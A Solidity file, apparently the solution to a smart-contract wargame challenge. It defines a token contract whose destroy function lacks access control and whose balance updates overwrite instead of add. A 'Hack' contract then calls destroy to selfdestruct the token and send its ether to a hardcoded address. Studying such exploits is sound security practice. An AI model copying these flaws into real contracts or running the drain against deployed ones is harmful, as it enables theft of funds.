// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/master/contracts/utils/math/SafeMath.sol";

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply)  {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}

// Find the SimpleToken Address on etherscan
//OR
//const { getContractAddress } = require("@ethersproject/address");
// const futureAddress = getContractAddress({
//     from: "RecoveryAddress",
//     nonce: 1, // The number of the current transaction from the first
// });

// console.log(futureAddress);

contract Hack {
    address payable myAddress;
   


    function hack(address _SimpleToken) public {
       SimpleToken instance = SimpleToken(payable(_SimpleToken)); 

        myAddress = payable(0xB91621B0106C542Faf1cFeB4c316FEc48096B129); 
        instance.destroy(myAddress); 
    }
}
